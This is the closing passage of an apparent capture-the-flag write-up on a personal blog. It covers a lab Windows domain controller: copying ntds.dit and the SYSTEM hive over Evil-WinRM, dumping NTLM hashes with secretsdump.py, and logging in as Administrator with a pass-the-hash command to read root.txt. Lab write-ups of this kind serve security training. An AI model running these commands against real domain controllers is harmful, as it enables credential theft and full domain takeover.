+*Evil-WinRM* PS Z:\Windows\ntds&gt; reg save hklm\system C:\temp\system.bak
+The operation completed successfully.
+
+*Evil-WinRM* PS Z:\Windows\ntds&gt; cd c:\Temp
+*Evil-WinRM* PS C:\Temp&gt; ls
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/25/2020   9:17 PM            629 2020-07-25_21-17-15_DC01.cab
+-a----        7/25/2020   9:16 PM            130 diskshadow.txt
+-a----        7/25/2020   9:25 PM       18874368 ntds.dit
+-a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
+-a----        7/25/2020   9:28 PM       17346560 system.bak
+
+
+*Evil-WinRM* PS C:\Temp&gt;
+</code></pre></div><ol start="7">
+<li>Download the artifacts:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; download ntds.dit
+Info: Downloading C:\Temp\ntds.dit to ntds.dit
+
+
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Temp&gt; download system.bak
+Info: Downloading C:\Temp\system.bak to system.bak
+
+
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Temp&gt;
+</code></pre></div><ol start="8">
+<li>Extract the secrets:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">secretsdump.py -ntds ntds.dit -system system.bak LOCAL
+Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+</code></pre></div><h2 id="administrator">Administrator</h2>
+<ol>
+<li>Connect with hash and try to read <code>root.txt</code>:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i 10.10.10.192
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/28/2020   4:36 PM            447 notes.txt
+-ar---        7/25/2020   8:49 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+1bfa3157fa8e8df6b43bf792ad37ff22
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;
+</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/FoxMaccloud">Fox Maccloud</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
